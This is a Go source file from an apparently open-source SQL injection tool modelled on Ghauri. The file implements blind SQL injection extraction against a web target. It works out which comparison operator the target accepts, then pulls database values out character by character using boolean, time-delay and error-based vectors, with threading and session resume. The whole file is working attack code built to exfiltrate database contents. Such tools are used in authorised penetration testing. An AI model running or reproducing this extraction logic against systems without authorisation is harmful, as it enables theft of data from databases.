package extract

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"sync"

	"github.com/SobhanYasami/sqlex/internal/config"
	"github.com/SobhanYasami/sqlex/internal/inject"
	"github.com/SobhanYasami/sqlex/internal/payloads"
	"github.com/SobhanYasami/sqlex/internal/request"
	"github.com/SobhanYasami/sqlex/internal/session"
	"github.com/SobhanYasami/sqlex/internal/utils"
)

// PayloadResponse is returned by FetchCharacters and related methods.
type PayloadResponse struct {
	OK      bool
	Resumed bool
	Result  string
	Payload string
	Error   string
}

// ExtractionCtx holds per-call context for data extraction.
type ExtractionCtx struct {
	URL           string
	Data          string
	Headers       http.Header
	Parameter     request.Parameter
	InjectionType string
	Vector        string
	VectorType    string // "boolean_vector" | "time_vector" | "error_vector"
	Base          *request.HTTPResponse
	Attack01      *request.HTTPResponse
	MatchString   string
	NotString     string
	Code          int
	Backend       string
	IsMultipart   bool
	IsJSON        bool
	IsXML         bool
	TextOnly      bool
	SessionPath   string
	TimeSec       int
}

// SearchOperator is a strategy function type used to identify a single character.
type SearchOperator func(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	payload string,   // DATA_EXTRACTION_PAYLOADS entry
	queryable string, // the SQL expression to extract
	pos, min, max int,
) (rune, error)

// OperatorType identifies which search strategy to use.
type OperatorType int

const (
	OpBinary  OperatorType = iota
	OpBetween
	OpIn
	OpLinear
)

// GhauriExtractor implements character-by-character blind SQL injection extraction.
type GhauriExtractor struct {
	sess *session.Session
}

func New(sess *session.Session) *GhauriExtractor {
	return &GhauriExtractor{sess: sess}
}

// injectCtx builds an inject.InjectCtx from ExtractionCtx.
func injectCtx(ectx ExtractionCtx) inject.InjectCtx {
	return inject.InjectCtx{
		URL:           ectx.URL,
		Data:          ectx.Data,
		Headers:       ectx.Headers,
		Parameter:     ectx.Parameter,
		InjectionType: ectx.InjectionType,
		IsMultipart:   ectx.IsMultipart,
		IsJSON:        ectx.IsJSON,
		IsXML:         ectx.IsXML,
		Backend:       ectx.Backend,
	}
}

// CheckOperator determines which search operator is usable for the given vector.
func (e *GhauriExtractor) CheckOperator(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
) (OperatorType, error) {
	timesec := cfg.TimeSec.Seconds()
	if timesec == 0 {
		timesec = 5
	}
	type probe struct {
		expr string
		op   OperatorType
	}
	probes := []probe{
		{
			expr: strings.ReplaceAll(strings.ReplaceAll(ectx.Vector, "[INFERENCE]", "6590>6420"), "[SLEEPTIME]", fmt.Sprintf("%.0f", timesec)),
			op:   OpBinary,
		},
		{
			expr: strings.ReplaceAll(strings.ReplaceAll(ectx.Vector, "[INFERENCE]", "6590 NOT BETWEEN 0 AND 6420"), "[SLEEPTIME]", fmt.Sprintf("%.0f", timesec)),
			op:   OpBetween,
		},
		{
			expr: strings.ReplaceAll(strings.ReplaceAll(ectx.Vector, "[INFERENCE]", "(SELECT(45))IN(10,45,60)"), "[SLEEPTIME]", fmt.Sprintf("%.0f", timesec)),
			op:   OpIn,
		},
		{
			expr: strings.ReplaceAll(strings.ReplaceAll(ectx.Vector, "[INFERENCE]", "09845=9845"), "[SLEEPTIME]", fmt.Sprintf("%.0f", timesec)),
			op:   OpLinear,
		},
	}

	// If user specified fetch_using, map it
	if cfg.FetchUsing != "" {
		opMap := map[string]OperatorType{
			"greater": OpBinary,
			"between": OpBetween,
			"in":      OpIn,
			"equal":   OpLinear,
		}
		if op, ok := opMap[cfg.FetchUsing]; ok {
			return op, nil
		}
	}

	for _, p := range probes {
		select {
		case <-ctx.Done():
			return OpBinary, ctx.Err()
		default:
		}
		resp, err := inject.Expression(ctx, cfg, rs, client, injectCtx(ectx), p.expr, false)
		if err != nil {
			continue
		}
		hit := false
		if ectx.VectorType == "boolean_vector" && ectx.Attack01 != nil {
			br := utils.CheckBooleanResponses(
				ectx.Base, resp, ectx.Attack01,
				ectx.Code, ectx.MatchString, ectx.NotString, ectx.TextOnly,
				&rs.MatchRatio, rs.BoolCheckOnCT,
				nil, nil, &rs.MatchRatioCheck, rs.Cases,
			)
			hit = br.Vulnerable
		} else if ectx.VectorType == "time_vector" {
			hit = resp.ResponseTime >= float64(cfg.TimeSec.Seconds())
		}
		if hit {
			return p.op, nil
		}
	}
	return OpBinary, fmt.Errorf("no working operator found")
}

// FetchLength extracts the length of a SQL expression result.
func (e *GhauriExtractor) FetchLength(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	pl string,
	queryable string,
	op OperatorType,
) (int, error) {
	// First determine number of digits in length (NOC)
	nocPL := payloads.NOCPayloads[ectx.Backend]
	noc := 1
	for digit := 1; digit <= 2; digit++ {
		probe := payloads.RenderNOCProbe(nocPL, queryable, digit)
		expr := strings.ReplaceAll(strings.ReplaceAll(ectx.Vector, "[INFERENCE]", probe), "[SLEEPTIME]", fmt.Sprintf("%d", int(cfg.TimeSec.Seconds())))
		resp, err := inject.Expression(ctx, cfg, rs, client, injectCtx(ectx), expr, false)
		if err != nil {
			continue
		}
		hit := evalHit(ectx, rs, resp, cfg)
		if hit {
			noc = digit
			break
		}
	}

	// Extract each digit of the length
	lengthPLs := payloads.LengthPL[ectx.Backend]
	if len(lengthPLs) == 0 {
		return 0, fmt.Errorf("no length payloads for backend %s", ectx.Backend)
	}
	lenPL := lengthPLs[0]
	length := 0
	multiplier := 1
	for pos := noc; pos >= 1; pos-- {
		ch, err := extractCharAt(ctx, cfg, rs, client, ectx, lenPL, queryable, pos, op)
		if err != nil {
			return 0, err
		}
		digit := int(ch) - '0'
		length += digit * multiplier
		multiplier *= 10
	}
	return length, nil
}

// FetchNOC returns the number of characters in the length string (1 or 2 digits).
func (e *GhauriExtractor) FetchNOC(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	queryable string,
) (int, error) {
	nocPL := payloads.NOCPayloads[ectx.Backend]
	for digit := 1; digit <= 10; digit++ {
		probe := payloads.RenderNOCProbe(nocPL, queryable, digit)
		expr := strings.ReplaceAll(strings.ReplaceAll(ectx.Vector, "[INFERENCE]", probe), "[SLEEPTIME]", fmt.Sprintf("%d", int(cfg.TimeSec.Seconds())))
		resp, err := inject.Expression(ctx, cfg, rs, client, injectCtx(ectx), expr, false)
		if err != nil {
			continue
		}
		if evalHit(ectx, rs, resp, cfg) {
			return digit, nil
		}
	}
	return 1, nil
}

// evalHit checks whether a response indicates a "true" condition.
func evalHit(ectx ExtractionCtx, rs *config.RunState, resp *request.HTTPResponse, cfg *config.Config) bool {
	if ectx.VectorType == "boolean_vector" && ectx.Attack01 != nil {
		var boolCTT, boolCTF int64
		br := utils.CheckBooleanResponses(
			ectx.Base, resp, ectx.Attack01,
			ectx.Code, ectx.MatchString, ectx.NotString, ectx.TextOnly,
			&rs.MatchRatio, rs.BoolCheckOnCT,
			&boolCTT, &boolCTF, &rs.MatchRatioCheck, rs.Cases,
		)
		return br.Vulnerable
	}
	if ectx.VectorType == "time_vector" {
		return resp.ResponseTime >= cfg.TimeSec.Seconds()
	}
	return false
}

// extractCharAt extracts one character at position pos using the given operator.
func extractCharAt(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	dataPL, queryable string,
	pos int,
	op OperatorType,
) (rune, error) {
	switch op {
	case OpBinary:
		return binarySearch(ctx, cfg, rs, client, ectx, dataPL, queryable, pos, 32, 127)
	case OpBetween:
		return betweenSearch(ctx, cfg, rs, client, ectx, dataPL, queryable, pos, 32, 127)
	case OpIn:
		return inOpSearch(ctx, cfg, rs, client, ectx, dataPL, queryable, pos, 32, 127)
	case OpLinear:
		return linearSearch(ctx, cfg, rs, client, ectx, dataPL, queryable, pos, 32, 127)
	}
	return 0, fmt.Errorf("unknown operator")
}

// FetchCharacters is the main entry point for extracting a string value.
// dumpType is used for session caching (e.g. "banner", "current_db").
// If queryCheck=true, just verifies a payload works (returns first working payload).
func (e *GhauriExtractor) FetchCharacters(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	queryPayloads []string,
	dumpType string,
	queryCheck bool,
) (PayloadResponse, error) {
	// Error-based extraction takes priority if error_vector is set
	if ectx.VectorType == "error_vector" || (ectx.VectorType == "" && rs.GetVector("error_vector") != "") {
		return e.fetchUsingErrorVector(ctx, cfg, rs, client, ectx, queryPayloads, dumpType)
	}

	// Session resume
	if dumpType != "" && e.sess != nil && cfg.SessionDir != "" {
		if val, length, _, ok := e.sess.FetchStoredResult(cfg.SessionDir, dumpType); ok {
			if length > 0 && len(val) == length {
				return PayloadResponse{OK: true, Resumed: true, Result: val, Payload: queryPayloads[0]}, nil
			}
		}
	}

	// Determine operator
	op, err := e.CheckOperator(ctx, cfg, rs, client, ectx)
	if err != nil && op == OpBinary {
		// fallback: try binary anyway
	}

	// Find a working payload (queryCheck or first in list)
	workingPayload := ""
	for _, pl := range queryPayloads {
		if queryCheck {
			// Just test if the payload produces a valid extraction
			noc, nocErr := e.FetchNOC(ctx, cfg, rs, client, ectx, pl)
			if nocErr == nil && noc > 0 {
				workingPayload = pl
				break
			}
			continue
		}
		workingPayload = pl
		break
	}
	if workingPayload == "" {
		return PayloadResponse{OK: false, Error: "no working payload found"}, nil
	}
	if queryCheck {
		return PayloadResponse{OK: true, Payload: workingPayload}, nil
	}

	// Get extraction payloads for backend
	dataPayloads := payloads.DataExtrPL[ectx.Backend]
	if dataPayloads == nil {
		return PayloadResponse{OK: false, Error: "no extraction payloads for " + ectx.Backend}, nil
	}
	// Prefer "no-cast" variant
	dataPL := dataPayloads["no-cast"]
	if dataPL == "" {
		for _, v := range dataPayloads {
			dataPL = v
			break
		}
	}

	// Fetch length
	length, err := e.FetchLength(ctx, cfg, rs, client, ectx, dataPL, workingPayload, op)
	if err != nil || length == 0 {
		return PayloadResponse{OK: false, Error: "failed to fetch length"}, nil
	}

	// Fetch characters (threaded or sequential)
	var result string
	startPos := 1
	// Resume partial result
	if dumpType != "" && e.sess != nil && cfg.SessionDir != "" {
		if val, storedLen, _, ok := e.sess.FetchStoredResult(cfg.SessionDir, dumpType); ok {
			if storedLen == length && len(val) > 0 {
				startPos = len(val) + 1
				result = val
			}
		}
	}

	if cfg.Threads > 1 {
		result, err = e.fetchCharsThreaded(ctx, cfg, rs, client, ectx, dataPL, workingPayload, startPos, length, op, result, dumpType)
	} else {
		result, err = e.fetchCharsSequential(ctx, cfg, rs, client, ectx, dataPL, workingPayload, startPos, length, op, result, dumpType)
	}
	if err != nil {
		return PayloadResponse{OK: false, Error: err.Error()}, nil
	}

	return PayloadResponse{OK: true, Result: result, Payload: workingPayload}, nil
}

func (e *GhauriExtractor) fetchCharsSequential(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	dataPL, queryable string,
	startPos, length int,
	op OperatorType,
	partial string,
	dumpType string,
) (string, error) {
	chars := []rune(partial)
	for pos := startPos; pos <= length; pos++ {
		select {
		case <-ctx.Done():
			return string(chars), ctx.Err()
		default:
		}
		ch, err := extractCharAt(ctx, cfg, rs, client, ectx, dataPL, queryable, pos, op)
		if err != nil {
			return string(chars), err
		}
		chars = append(chars, ch)
		partial = string(chars)
		if e.sess != nil && cfg.SessionDir != "" && dumpType != "" {
			_ = e.sess.UpsertResult(cfg.SessionDir, dumpType, partial, length)
		}
	}
	return string(chars), nil
}

type charResult struct {
	pos int
	ch  rune
	err error
}

func (e *GhauriExtractor) fetchCharsThreaded(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	dataPL, queryable string,
	startPos, length int,
	op OperatorType,
	partial string,
	dumpType string,
) (string, error) {
	type posChar struct {
		pos int
		ch  rune
	}
	chars := make(map[int]rune)
	for i, r := range []rune(partial) {
		chars[i+1] = r
	}
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, cfg.Threads)
	errCh := make(chan error, 1)

	for pos := startPos; pos <= length; pos++ {
		pos := pos
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			ch, err := extractCharAt(ctx, cfg, rs, client, ectx, dataPL, queryable, pos, op)
			if err != nil {
				select {
				case errCh <- err:
				default:
				}
				return
			}
			mu.Lock()
			chars[pos] = ch
			mu.Unlock()
		}()
	}
	wg.Wait()

	select {
	case err := <-errCh:
		return "", err
	default:
	}

	// Assemble ordered result
	var sb strings.Builder
	for i := 1; i <= length; i++ {
		if ch, ok := chars[i]; ok {
			sb.WriteRune(ch)
		}
	}
	result := sb.String()
	if e.sess != nil && cfg.SessionDir != "" && dumpType != "" {
		_ = e.sess.UpsertResult(cfg.SessionDir, dumpType, result, length)
	}
	return result, nil
}

// fetchUsingErrorVector extracts data via error-based SQLi.
func (e *GhauriExtractor) fetchUsingErrorVector(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	queryPayloads []string,
	dumpType string,
) (PayloadResponse, error) {
	// Session resume
	if dumpType != "" && e.sess != nil && cfg.SessionDir != "" {
		if val, length, _, ok := e.sess.FetchStoredResult(cfg.SessionDir, dumpType); ok {
			if length > 0 && len(val) == length {
				return PayloadResponse{OK: true, Resumed: true, Result: val, Payload: queryPayloads[0]}, nil
			}
		}
	}

	errorPatterns := []string{
		payloads.Regex["xpath"],
		payloads.Regex["error_based"],
		payloads.Regex["bigint"],
		payloads.Regex["double"],
		payloads.Regex["geometric"],
		payloads.Regex["gtid"],
		payloads.Regex["json_keys"],
		payloads.Regex["generic"],
		payloads.Regex["generic_errors"],
		payloads.Regex["mssql_string"],
	}

	vector := ectx.Vector
	for _, pl := range queryPayloads {
		expr := strings.ReplaceAll(vector, "[INFERENCE]", pl)
		resp, err := inject.Expression(ctx, cfg, rs, client, injectCtx(ectx), expr, false)
		if err != nil {
			continue
		}
		value := utils.SearchRegex(errorPatterns, resp.Text)
		if value != "" && value != "<blank_value>" {
			if e.sess != nil && cfg.SessionDir != "" && dumpType != "" {
				_ = e.sess.UpsertResult(cfg.SessionDir, dumpType, value, len(value))
			}
			return PayloadResponse{OK: true, Result: value, Payload: pl}, nil
		}
	}
	return PayloadResponse{OK: false, Error: "error-based extraction failed"}, nil
}
